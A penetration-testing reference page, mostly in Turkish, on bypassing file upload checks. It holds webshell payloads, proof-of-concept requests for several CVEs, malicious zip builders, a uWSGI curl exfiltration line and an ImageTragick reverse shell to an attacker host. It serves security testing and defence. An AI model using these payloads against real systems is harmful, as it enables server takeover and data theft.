# Dosya Yükleme

{{#include ../../banners/hacktricks-training.md}}

## Dosya Yükleme Genel Metodolojisi

Diğer faydalı uzantılar:

- **PHP**: _.php_, _.php2_, _.php3_, ._php4_, ._php5_, ._php6_, ._php7_, .phps, ._pht_, ._phtm, .phtml_, ._pgif_, _.shtml, .htaccess, .phar, .inc, .hphp, .ctp, .module_
- **Working in PHPv8**: _.php_, _.php4_, _.php5_, .phtml_, .module_, .inc_, .hphp_, .ctp_
- **ASP**: _.asp, .aspx, .config, .ashx, .asmx, .aspq, .axd, .cshtm, .cshtml, .rem, .soap, .vbhtm, .vbhtml, .asa, .cer, .shtml_
- **Jsp:** _.jsp, .jspx, .jsw, .jsv, .jspf, .wss, .do, .action_
- **Coldfusion:** _.cfm, .cfml, .cfc, .dbm_
- **Flash**: _.swf_
- **Perl**: _.pl, .cgi_
- **Erlang Yaws Web Server**: _.yaws_

### Dosya uzantısı kontrollerini atlatma

1. Eğer uygulanıyorsa, önceki uzantıları **kontrol edin**. Ayrıca bunları bazı **büyük harfler** kullanarak test edin: _pHp, .pHP5, .PhAr ..._
2. _Çalıştırma uzantısından önce geçerli bir uzantı **eklemeyi kontrol edin** (önceki uzantıları da kullanın):_
- _file.png.php_
- _file.png.Php5_
3. Sondan **özel karakterler** eklemeyi deneyin. Tüm **ascii** ve **Unicode** karakterlerini **bruteforce** etmek için Burp’u kullanabilirsiniz. (_Not: ayrıca daha önce bahsedilen **uzantıları** de kullanmayı deneyebilirsiniz_)
- _file.php%20_
- _file.php%0a_
- _file.php%00_
- _file.php%0d%0a_
- _file.php/_
- _file.php.\\_
- _file._
- _file.php...._
- _file.pHp5...._
4. Koruma mekanizmalarını, sunucu tarafının uzantı ayrıştırıcısını kandırarak atlatmayı deneyin; örneğin uzantıyı **iki kez yazma** veya uzantılar arasına **çöp** veri (**null** byte'lar) ekleme gibi. _Daha iyi bir payload hazırlamak için önceki uzantıları da kullanabilirsiniz._
- _file.png.php_
- _file.png.pHp5_
- _file.php#.png_
- _file.php%00.png_
- _file.php\x00.png_
- _file.php%0a.png_
- _file.php%0d%0a.png_
- _file.phpJunk123png_
5. Önceki kontrole başka bir uzantı katmanı ekleyin:
- _file.png.jpg.php_
- _file.php%00.png%00.jpg_
6. Çalıştırma uzantısını geçerli uzantıdan önce koymayı deneyin ve sunucunun yanlış yapılandırılmış olmasını umun. (Apache yanlış yapılandırmalarını sömürmek için faydalı; örneğin uzantısı **.php** olan herhangi bir şey, sonu .php olmasa bile kod çalıştırabilir):
- _ex: file.php.png_
7. **Windows**’ta **NTFS alternate data stream (ADS)** kullanma. Bu durumda, yasaklı bir uzantıdan sonra ve izin verilen bir uzantıdan önce bir iki nokta üst üste ":" karakteri eklenir. Sonuç olarak sunucuda yasaklı uzantıya sahip **boş bir dosya** oluşturulur (ör. "file.asax:.jpg"). Bu dosya daha sonra kısa dosya adı gibi başka tekniklerle düzenlenebilir. "**::$data**" deseni de dolu dosyalar oluşturmak için kullanılabilir. Bu nedenle, bu desenin sonuna bir nokta eklemek (.ör. "file.asp::$data.") daha fazla kısıtlamayı atlatmakta faydalı olabilir.
8. Dosya adı sınırlarını aşmayı deneyin. Geçerli uzantı kesilir ve kötü amaçlı PHP kalır. AAA<--SNIP-->AAA.php

```
# Linux maximum 255 bytes
/usr/share/metasploit-framework/tools/exploit/pattern_create.rb -l 255
Aa0Aa1Aa2Aa3Aa4Aa5Aa6Aa7Aa8Aa9Ab0Ab1Ab2Ab3Ab4Ab5Ab6Ab7Ab8Ab9Ac0Ac1Ac2Ac3Ac4Ac5Ac6Ac7Ac8Ac9Ad0Ad1Ad2Ad3Ad4Ad5Ad6Ad7Ad8Ad9Ae0Ae1Ae2Ae3Ae4Af5Af6Af7Af8Af9Ag0Ag1Ag2Ag3Ag4Ag5Ag6Ag7Ag8Ag9Ah0Ah1Ah2Ah3Ah4Ah5Ah6Ah7Ah8Ah9Ai0Ai1Ai2Ai3Ai4 # minus 4 here and adding .png
# Upload the file and check response how many characters it alllows. Let's say 236
python -c 'print "A" * 232'
AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA
# Make the payload
AAA<--SNIP 232 A-->AAA.php.png
```

#### UniSharp Laravel Filemanager pre-2.9.1 (.php. trailing dot) – CVE-2024-21546

Some upload handlers trim or normalize trailing dot characters from the saved filename. In UniSharp’s Laravel Filemanager (unisharp/laravel-filemanager) versions before 2.9.1, you can bypass extension validation by:

- Using a valid image MIME and magic header (e.g., PNG’s `\x89PNG\r\n\x1a\n`).
- Naming the uploaded file with a PHP extension followed by a dot, e.g., `shell.php.`.
- The server strips the trailing dot and persists `shell.php`, which will execute if it’s placed in a web-served directory (default public storage like `/storage/files/`).

Minimal PoC (Burp Repeater):
```http
POST /profile/avatar HTTP/1.1
Host: target
Content-Type: multipart/form-data; boundary=----WebKitFormBoundary

------WebKitFormBoundary
Content-Disposition: form-data; name="upload"; filename="0xdf.php."
Content-Type: image/png

\x89PNG\r\n\x1a\n<?php system($_GET['cmd']??'id'); ?>
------WebKitFormBoundary--
```
Sonra kaydedilmiş yola erişin (Laravel + LFM için tipik):
```
GET /storage/files/0xdf.php?cmd=id
```
Mitigations:
- Upgrade unisharp/laravel-filemanager to ≥ 2.9.1.
- Enforce strict server-side allowlists and re-validate the persisted filename.
- Serve uploads from non-executable locations.

### Bypass Content-Type, Magic Number, Compression & Resizing

- Bypass **Content-Type** checks by setting the **value** of the **Content-Type** **header** to: _image/png_ , _text/plain , application/octet-stream_
1. Content-Type **wordlist**: [https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt](https://github.com/danielmiessler/SecLists/blob/master/Miscellaneous/Web/content-type.txt)
- Bypass **magic number** check by adding at the beginning of the file the **bytes of a real image** (confuse the _file_ command). Or introduce the shell inside the **metadata**:\
`exiftool -Comment="<?php echo 'Command:'; if($_POST){system($_POST['cmd']);} __halt_compiler();" img.jpg`\
`\` or you could also **introduce the payload directly** in an image:\
`echo '<?php system($_REQUEST['cmd']); ?>' >> img.png`
- If **compressions is being added to your image**, for example using some standard PHP libraries like [PHP-GD](https://www.php.net/manual/fr/book.image.php), the previous techniques won't be useful it. However, you could use the **PLTE chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_plte_png.php)
- The web page could also be **resizing** the **image**, using for example the PHP-GD functions `imagecopyresized` or `imagecopyresampled`. However, you could use the **IDAT chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_idat_png.php)
- Another technique to make a payload that **survives an image resizing**, using the PHP-GD function `thumbnailImage`. However, you could use the **tEXt chunk** [**technique defined here**](https://www.synacktiv.com/publications/persistent-php-payloads-in-pngs-how-to-inject-php-code-in-an-image-and-keep-it-there.html) to insert some text that will **survive compression**.
- [**Github with the code**](https://github.com/synacktiv/astrolock/blob/main/payloads/generators/gen_tEXt_png.php)

### Other Tricks to check

- Find a vulnerability to **rename** the file already uploaded (to change the extension).
- Find a **Local File Inclusion** vulnerability to execute the backdoor.
- **Possible Information disclosure**:
1. Upload **several times** (and at the **same time**) the **same file** with the **same name**
2. Upload a file with the **name** of a **file** or **folder** that **already exists**
3. Uploading a file with **"." , "..", or "…" as its name**. For instance, in Apache in **Windows**, if the application saves the uploaded files in "/www/uploads/" directory, the "." filename will create a file called
uploads” in the "/www/" directory.
4. Upload a file that may not be deleted easily such as **"…:.jpg"** in **NTFS**. (Windows)
5. Upload a file in **Windows** with **invalid characters** such as `|<>*?”` in its name. (Windows)
6. Upload a file in **Windows** using **reserved** (**forbidden**) **names** such as CON, PRN, AUX, NUL, COM1, COM2, COM3, COM4, COM5, COM6, COM7, COM8, COM9, LPT1, LPT2, LPT3, LPT4, LPT5, LPT6, LPT7, LPT8, and LPT9.
- Try also to **upload an executable** (.exe) or an **.html** (less suspicious) that **will execute code** when accidentally opened by victim.

### Special extension tricks

If you are trying to upload files to a **PHP server**, [take a look at the **.htaccess** trick to execute code](https://book.hacktricks.wiki/en/network-services-pentesting/pentesting-web/php-tricks-esp/index.html#code-execution).\
If you are trying to upload files to an **ASP server**, [take a look at the **.config** trick to execute code](../../network-services-pentesting/pentesting-web/iis-internet-information-services.md#execute-config-files).

The `.phar` files are like the `.jar` for java, but for php, and can be **used like a php file** (executing it with php, or including it inside a script...)

The `.inc` extension is sometimes used for php files that are only used to **import files**, so, at some point, someone could have allow **this extension to be executed**.

## **Jetty RCE**

If you can upload a XML file into a Jetty server you can obtain [RCE because **new *.xml and *.war are automatically processed**](https://twitter.com/ptswarm/status/1555184661751648256/photo/1)**.** So, as mentioned in the following image, upload the XML file to `$JETTY_BASE/webapps/` and expect the shell!

![https://twitter.com/ptswarm/status/1555184661751648256/photo/1](<../../images/image (1047).png>)

## **uWSGI RCE**

For a detailed exploration of this vulnerability check the original research: [uWSGI RCE Exploitation](https://blog.doyensec.com/2023/02/28/new-vector-for-dirty-arbitrary-file-write-2-rce.html).

Remote Command Execution (RCE) vulnerabilities can be exploited in uWSGI servers if one has the capability to modify the `.ini` configuration file. uWSGI configuration files leverage a specific syntax to incorporate "magic" variables, placeholders, and operators. Notably, the '@' operator, utilized as `@(filename)`, is designed to include the contents of a file. Among the various supported schemes in uWSGI, the "exec" scheme is particularly potent, allowing the reading of data from a process's standard output. This feature can be manipulated for nefarious purposes such as Remote Command Execution or Arbitrary File Write/Read when a `.ini` configuration file is processed.

Consider the following example of a harmful `uwsgi.ini` file, showcasing various schemes:
```ini
[uwsgi]
; read from a symbol
foo = @(sym://uwsgi_funny_function)
; read from binary appended data
bar = @(data://[REDACTED])
; read from http
test = @(http://[REDACTED])
; read from a file descriptor
content = @(fd://[REDACTED])
; read from a process stdout
body = @(exec://whoami)
; curl to exfil via collaborator
extra = @(exec://curl http://collaborator-unique-host.oastify.com)
; call a function returning a char *
characters = @(call://uwsgi_func)
```
Payload'un yürütülmesi, yapılandırma dosyasının ayrıştırılması sırasında gerçekleşir. Yapılandırmanın etkinleştirilip ayrıştırılması için uWSGI sürecinin ya yeniden başlatılması (muhtemelen bir çökme sonrasında veya bir Denial of Service saldırısı nedeniyle) ya da dosyanın otomatik yeniden yüklemeye (auto-reload) ayarlanması gerekir. Auto-reload özelliği etkinse, değişiklik tespit edildiğinde dosyayı belirli aralıklarla yeniden yükler.

uWSGI'nin yapılandırma dosyası ayrıştırmasının gevşek doğasını anlamak çok önemlidir. Özellikle, söz konusu payload bir ikili dosyaya (örneğin bir görüntü veya PDF gibi) yerleştirilebilir; bu da potansiyel kötüye kullanım kapsamını daha da genişletir.

### Gibbon LMS arbitrary file write to pre-auth RCE (CVE-2023-45878)

Kimlik doğrulama gerektirmeyen bir endpoint, web root içinde arbitrary file write yapılmasına izin veriyor; bu da bir PHP dosyası düşürülerek pre-auth RCE'ye yol açıyor. Etkilenen sürümler: 25.0.01 dahil olmak üzere önceki sürümler.

- Endpoint: `/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php`
- Method: POST
- Gerekli parametreler:
- `img`: data-URI-like string: `[mime];[name],[base64]` (sunucu type/name'i yoksayar, kuyruğu base64 olarak çözer)
- `path`: Gibbon kurulum dizinine göre göreceli hedef dosya adı (ör. `poc.php` veya `0xdf.php`)
- `gibbonPersonID`: herhangi boş olmayan bir değer kabul edilir (ör. `0000000001`)

Bir dosya yazmak ve geri okumak için minimal PoC:
```bash
# Prepare test payload
printf '0xdf was here!' | base64
# => MHhkZiB3YXMgaGVyZSEK

# Write poc.php via unauth POST
curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;test,MHhkZiB3YXMgaGVyZSEK&path=poc.php&gibbonPersonID=0000000001'

# Verify write
curl http://target/Gibbon-LMS/poc.php
```
Minimal bir webshell bırakın ve komutları çalıştırın:
```bash
# '<?php system($_GET["cmd"]); ?>' base64
# PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==

curl http://target/Gibbon-LMS/modules/Rubrics/rubrics_visualise_saveAjax.php \
-d 'img=image/png;foo,PD9waHAgIHN5c3RlbSgkX0dFVFsiY21kIl0pOyA/Pg==&path=shell.php&gibbonPersonID=0000000001'

curl 'http://target/Gibbon-LMS/shell.php?cmd=whoami'
```
Notlar:
- Handler, `;` ve `,` ile ayırdıktan sonra `base64_decode($_POST["img"])` işlemini yapar, ardından uzantı/tip doğrulaması yapmadan byte'ları `$absolutePath . '/' . $_POST['path']`'e yazar.
- Ortaya çıkan kod web servis kullanıcısı olarak çalışır (ör. XAMPP Apache on Windows).

Bu hata için referanslar usd HeroLab advisory ve NVD girdisini içerir. Aşağıdaki References bölümüne bakın.

## **wget Dosya Yükleme/SSRF Hilesi**

Bazı durumlarda bir sunucunun **`wget`** kullanarak **dosya indirdiğini** ve URL'yi **belirtebileceğinizi** görebilirsiniz. Bu durumlarda, kod indirilen dosyaların uzantısının yalnızca izin verilen dosyaların indirileceğinden emin olmak için bir whitelist içinde olup olmadığını kontrol ediyor olabilir. Ancak, **bu kontrol atlatılabilir.**\
Linux'ta bir dosya adının **maksimum** uzunluğu **255**'tir, ancak **wget** dosya adlarını **236** karaktere kısaltır. **"A"*232+".php"+".gif"** adlı bir dosyayı indirebilirsiniz; bu dosya adı **kontrolü atlatır** (bu örnekte **".gif"** geçerli bir uzantıdır) ancak `wget` dosyayı **"A"*232+".php"** olarak yeniden adlandıracaktır.
```bash
#Create file and HTTP server
echo "SOMETHING" > $(python -c 'print("A"*(236-4)+".php"+".gif")')
python3 -m http.server 9080
```

```bash
#Download the file
wget 127.0.0.1:9080/$(python -c 'print("A"*(236-4)+".php"+".gif")')
The name is too long, 240 chars total.
Trying to shorten...
New name is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.
--2020-06-13 03:14:06--  http://127.0.0.1:9080/AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php.gif
Connecting to 127.0.0.1:9080... connected.
HTTP request sent, awaiting response... 200 OK
Length: 10 [image/gif]
Saving to: ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’

AAAAAAAAAAAAAAAAAAAAAAAAAAAAA 100%[===============================================>]      10  --.-KB/s    in 0s

2020-06-13 03:14:06 (1.96 MB/s) - ‘AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA.php’ saved [10/10]
```
Unutmayın ki **başka bir seçenek** olarak düşünebileceğiniz şey, **HTTP sunucusunun farklı bir dosyaya yönlendirme yapmasıdır**, böylece ilk URL kontrolü atlatır; ancak wget yönlendirilen dosyayı yeni adıyla indirecektir. Bu **çalışmaz** **eğer** wget `--trust-server-names` **parametresiyle** kullanılmıyorsa çünkü **wget yönlendirilmiş sayfayı orijinal URL'de belirtilen dosya adıyla indirecektir**.

### Yükleme dizininden kaçış NTFS junctions (Windows) aracılığıyla

(Bu saldırı için Windows makinesine lokal erişiminiz olması gerekecektir) Windows üzerinde yüklemeler kullanıcı başına alt klasörlerde saklanıyorsa (ör. C:\Windows\Tasks\Uploads\<id>\) ve bu alt klasörün oluşturulmasını/silinmesini kontrol ediyorsanız, bunu hassas bir konuma (ör. the webroot) işaret eden bir directory junction ile değiştirebilirsiniz. Sonraki yüklemeler hedef yola yazılacak ve hedef sunucu tarafı kodu yorumluyorsa kod çalıştırmaya imkan verecektir.

XAMPP webroot'una yüklemeleri yönlendirmek için örnek akış:
```cmd
:: 1) Upload once to learn/confirm your per-user folder name (e.g., md5 of form fields)
::    Observe it on disk: C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882

:: 2) Remove the created folder and create a junction to webroot
rmdir C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882
cmd /c mklink /J C:\Windows\Tasks\Uploads\33d81ad509ef34a2635903babb285882 C:\xampp\htdocs

:: 3) Re-upload your payload; it lands under C:\xampp\htdocs
::    Minimal PHP webshell for testing
::    <?php echo shell_exec($_REQUEST['cmd']); ?>

:: 4) Trigger
curl "http://TARGET/shell.php?cmd=whoami"
```
Notlar
- mklink /J bir NTFS directory junction (reparse point) oluşturur. Web server’ın hesabı junction’ı takip etmeli ve hedefte yazma iznine sahip olmalıdır.
- Bu, rastgele dosya yazmalarını yönlendirir; eğer hedef script çalıştırıyorsa (PHP/ASP), bu RCE’ye dönüşür.
- Defanslar: writable upload köklerinin C:\Windows\Tasks veya benzeri altında attacker‑controllable olmasına izin vermeyin; junction oluşturmayı engelleyin; uzantıları server‑side validate edin; upload’ları ayrı bir volume’da veya deny‑execute ACLs ile depolayın.

### GZIP-compressed body upload + path traversal in destination param → JSP webshell RCE (Tomcat)

Some upload/ingest handlers write the raw request body to a filesystem path that is constructed from user-controlled query parameters. If the handler also supports Content-Encoding: gzip and fails to canonicalize/validate the destination path, you can combine directory traversal with a gzipped payload to write arbitrary bytes into a web-served directory and obtain RCE (e.g., drop a JSP under Tomcat’s webapps).

Generic exploitation flow:
- Prepare your server-side payload (e.g., minimal JSP webshell) and gzip-compress the bytes.
- Send a POST where a path parameter (e.g., token) contains traversal escaping the intended folder, and file indicates the filename to persist. Set Content-Type: application/octet-stream and Content-Encoding: gzip; the body is the compressed payload.
- Browse to the written file to trigger execution.

Illustrative request:
```http
POST /fileupload?token=..%2f..%2f..%2f..%2fopt%2ftomcat%2fwebapps%2fROOT%2Fjsp%2F&file=shell.jsp HTTP/1.1
Host: target
Content-Type: application/octet-stream
Content-Encoding: gzip
Content-Length: <len>

<gzip-compressed-bytes-of-your-jsp>
```
Ardından tetikleyin:
```http
GET /jsp/shell.jsp?cmd=id HTTP/1.1
Host: target
```
Notlar
- Hedef yollar kurulumlara göre değişir (ör. /opt/TRUfusion/web/tomcat/webapps/trufusionPortal/jsp/ bazı stack'lerde). JSP çalıştıran herhangi bir web'e açık klasör işe yarar.
- Burp Suite’s Hackvertor extension, payload'ınızdan doğru bir gzip gövdesi üretebilir.
- Bu saf pre-auth arbitrary file write → RCE deseni; multipart parsing'e dayanmaz.

Önlemler
- Yükleme hedeflerini sunucu tarafında türetin; istemciden gelen yol parçalarına asla güvenmeyin.
- Çözümlenen yolun izinli bir temel dizin içinde kaldığını kanonikleştirip zorunlu kılın.
- Yüklemeleri yürütülemeyen bir volume üzerinde saklayın ve yazılabilir dizinlerden script çalıştırılmasını engelleyin.

## Tools

- [Upload Bypass](https://github.com/sAjibuu/Upload_Bypass) güçlü bir araçtır; Pentesters ve Bug Hunters'ın file upload mekanizmalarını test etmelerine yardımcı olmak için tasarlanmıştır. Çeşitli bug bounty tekniklerinden yararlanarak, güvenlik açıklarını belirleme ve istismar etme sürecini basitleştirir ve web uygulamalarının kapsamlı değerlendirilmesini sağlar.

### Corrupting upload indices with snprintf quirks (historical)

Bazı eski upload handler'lar tek dosya yüklemesinden multi-file array'leri oluşturmak için `snprintf()` veya benzeri fonksiyonları kullanır ve bu handler'lar `_FILES` yapısını sahteleyebilmek için kandırılabilir. `snprintf()` davranışındaki tutarsızlıklar ve kesilmeler nedeniyle, dikkatle hazırlanmış tek bir yükleme sunucu tarafında birden fazla indekslenmiş dosya gibi görünebilir ve katı bir şekil varsayan mantığı (ör. bunu multi-file upload gibi ele alıp güvensiz dallara gitmek) şaşırtabilir. Günümüzde niş olsa da, bu “index corruption” paterni ara sıra CTF'lerde ve eski kod tabanlarında tekrar ortaya çıkar.

## Dosya yüklemeden diğer zafiyetlere

- Set **filename** to `../../../tmp/lol.png` and try to achieve a **path traversal**
- Set **filename** to `sleep(10)-- -.jpg` and you may be able to achieve a **SQL injection**
- Set **filename** to `<svg onload=alert(document.domain)>` to achieve a XSS
- Set **filename** to `; sleep 10;` to test some command injection (more [command injections tricks here](../command-injection.md))
- [**XSS** in image (svg) file upload](../xss-cross-site-scripting/index.html#xss-uploading-files-svg)
- **JS** file **upload** + **XSS** = [**Service Workers** exploitation](../xss-cross-site-scripting/index.html#xss-abusing-service-workers)
- [**XXE in svg upload**](../xxe-xee-xml-external-entity.md#svg-file-upload)
- [**Open Redirect** via uploading svg file](../open-redirect.md#open-redirect-uploading-svg-files)
- Farklı **svg payload**'larını deneyin: [**https://github.com/allanlw/svg-cheatsheet**](https://github.com/allanlw/svg-cheatsheet)
- [Famous **ImageTrick** vulnerability](https://mukarramkhalid.com/imagemagick-imagetragick-exploit/)
- Eğer web sunucusuna bir URL'den görsel çekmesini söyleyebiliyorsanız, bunu bir [SSRF](../ssrf-server-side-request-forgery/index.html) için suistimal etmeyi deneyebilirsiniz. Eğer bu **image** bir **public** sitede **saved** olacaksa, ayrıca [https://iplogger.org/invisible/](https://iplogger.org/invisible/) adresinden bir URL belirterek **her ziyaretçinin bilgilerini çalabilirsiniz**.
- [**XXE and CORS** bypass with PDF-Adobe upload](pdf-upload-xxe-and-cors-bypass.md)
- XSS için özel hazırlanmış PDF'ler: [following page present how to **inject PDF data to obtain JS execution**](../xss-cross-site-scripting/pdf-injection.md). Eğer PDF yükleyebiliyorsanız, verilen yönergeleri takip ederek rastgele JS çalıştıracak bir PDF hazırlayabilirsiniz.
- Upload the \[eicar]\([**https://secure.eicar.org/eicar.com.txt**](https://secure.eicar.org/eicar.com.txt)) content to check if the server has any **antivirus**
- Dosya yüklerken herhangi bir **boyut limiti** olup olmadığını kontrol edin

Buradan alınan bir liste olarak yükleme ile başarabileceklerinizin ilk 10'u:

1. **ASP / ASPX / PHP5 / PHP / PHP3**: Webshell / RCE
2. **SVG**: Stored XSS / SSRF / XXE
3. **GIF**: Stored XSS / SSRF
4. **CSV**: CSV injection
5. **XML**: XXE
6. **AVI**: LFI / SSRF
7. **HTML / JS** : HTML injection / XSS / Open redirect
8. **PNG / JPEG**: Pixel flood attack (DoS)
9. **ZIP**: RCE via LFI / DoS
10. **PDF / PPTX**: SSRF / BLIND XXE

#### Burp Extension


{{#ref}}
https://github.com/portswigger/upload-scanner
{{#endref}}

## Magic Header Bytes

- **PNG**: `"\x89PNG\r\n\x1a\n\0\0\0\rIHDR\0\0\x03H\0\x s0\x03["`
- **JPG**: `"\xff\xd8\xff"`

Diğer dosya tipleri için bkz. [https://en.wikipedia.org/wiki/List_of_file_signatures](https://en.wikipedia.org/wiki/List_of_file_signatures).

## Zip/Tar Dosyasının Sunucuda Otomatik Olarak Açılmasıyla Yükleme

Eğer sunucu içinde açılacak bir ZIP yükleyebiliyorsanız, iki şey yapabilirsiniz:

### Symlink

Diğer dosyalara soft link'ler içeren bir link yükleyin; ardından açılmış dosyalara eriştiğinizde bağlı dosyalara erişirsiniz:
```
ln -s ../../../index.php symindex.txt
zip --symlinks test.zip symindex.txt
tar -cvf test.tar symindex.txt
```
### Farklı klasörlere açma

Sıkıştırmayı açma sırasında dizinlerde beklenmedik dosya oluşturulması ciddi bir sorundur. Başlangıçta bu yapılandırmanın kötü amaçlı dosya yüklemeleri yoluyla OS-level komut yürütmesini engelleyebileceği düşünülse de, ZIP archive formatının hiyerarşik sıkıştırma desteği ve directory traversal yetenekleri istismar edilebilir. Bu, saldırganların hedef uygulamanın sıkıştırmayı açma işlevini manipüle ederek kısıtlamaları atlamasına ve güvenli yükleme dizinlerinden kaçmasına olanak tanır.

Böyle dosyaları oluşturmak için otomatik bir exploit şu adreste mevcuttur: [**evilarc on GitHub**](https://github.com/ptoomey3/evilarc). Araç şu şekilde kullanılabilir:
```python
# Listing available options
python2 evilarc.py -h
# Creating a malicious archive
python2 evilarc.py -o unix -d 5 -p /var/www/html/ rev.php
```
Ek olarak, **symlink trick with evilarc** bir seçenektir. Hedef `/flag.txt` gibi bir dosya ise, sisteminizde o dosyaya bir symlink oluşturulmalıdır. Bu, evilarc'ın çalışması sırasında hata ile karşılaşmamasını sağlar.

Aşağıda kötü amaçlı bir zip dosyası oluşturmak için kullanılan Python koduna bir örnek bulunmaktadır:
```python
#!/usr/bin/python
import zipfile
from io import BytesIO


def create_zip():
f = BytesIO()
z = zipfile.ZipFile(f, 'w', zipfile.ZIP_DEFLATED)
z.writestr('../../../../../var/www/html/webserver/shell.php', '<?php echo system($_REQUEST["cmd"]); ?>')
z.writestr('otherfile.xml', 'Content of the file')
z.close()
zip = open('poc.zip','wb')
zip.write(f.getvalue())
zip.close()

create_zip()
```
**Sıkıştırmanın file spraying için kötüye kullanımı**

For further details **check the original post in**: [https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/](https://blog.silentsignal.eu/2014/01/31/file-upload-unzip/)

1.  **Creating a PHP Shell**: PHP kodu, `$_REQUEST` değişkeniyle gönderilen komutları çalıştırmak için yazılmıştır.

```php
<?php
if(isset($_REQUEST['cmd'])){
$cmd = ($_REQUEST['cmd']);
system($cmd);
}?>
```

2.  **File Spraying and Compressed File Creation**: Birden fazla dosya oluşturulur ve bu dosyaları içeren bir zip arşivi hazırlanır.

```bash
root@s2crew:/tmp# for i in `seq 1 10`;do FILE=$FILE"xxA"; cp simple-backdoor.php $FILE"cmd.php";done
root@s2crew:/tmp# zip cmd.zip xx*.php
```

3.  **Modification with a Hex Editor or vi**: Zip içindeki dosya isimleri vi veya bir hex editor kullanılarak değiştirilir; "xxA" dizinler arası geçiş yapmak için "../" ile değiştirilir.

```bash
:set modifiable
:%s/xxA/../g
:x!
```

## ImageTragic

Bu içeriği bir image uzantısıyla yükleyerek zafiyeti istismar edebilirsiniz **(ImageMagick , 7.0.1-1)** (form the [exploit](https://www.exploit-db.com/exploits/39767))
```
push graphic-context
viewbox 0 0 640 480
fill 'url(https://127.0.0.1/test.jpg"|bash -i >& /dev/tcp/attacker-ip/attacker-port 0>&1|touch "hello)'
pop graphic-context
```
## Embedding PHP Shell on PNG

Bir PNG dosyasının IDAT chunk'ına bir PHP shell gömmek, belirli görüntü işleme operasyonlarını etkili bir şekilde atlatabilir. PHP-GD'den `imagecopyresized` ve `imagecopyresampled` fonksiyonları bu bağlamda özellikle önemlidir; çünkü bunlar sırasıyla görüntüleri yeniden boyutlandırma ve yeniden örnekleme için yaygın olarak kullanılır. Gömülü PHP shell'in bu işlemlerden etkilenmeden kalabilmesi, bazı kullanım senaryoları için önemli bir avantajdır.

Bu tekniğin metodolojisi ve potansiyel uygulamaları dahil olmak üzere ayrıntılı bir inceleme şu makalede yer almaktadır: ["Encoding Web Shells in PNG IDAT chunks"](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/). Bu kaynak, sürecin ve sonuçlarının kapsamlı bir şekilde anlaşılmasını sağlar.

More information in: [https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/](https://www.idontplaydarts.com/2012/06/encoding-web-shells-in-png-idat-chunks/)

## Polyglot Dosyalar

Polyglot dosyalar, siber güvenlikte benzersiz bir araç olarak hizmet eder; aynı anda birden fazla dosya formatında geçerli şekilde var olabilen bukalemunlar gibi davranırlar. İlginç bir örnek, hem GIF hem de RAR arşivi olarak işlev gören bir [GIFAR](https://en.wikipedia.org/wiki/Gifar) hibritidir. Bu tür dosyalar sadece bu eşleşmeyle sınırlı değildir; GIF ve JS veya PPT ve JS gibi kombinasyonlar da mümkündür.

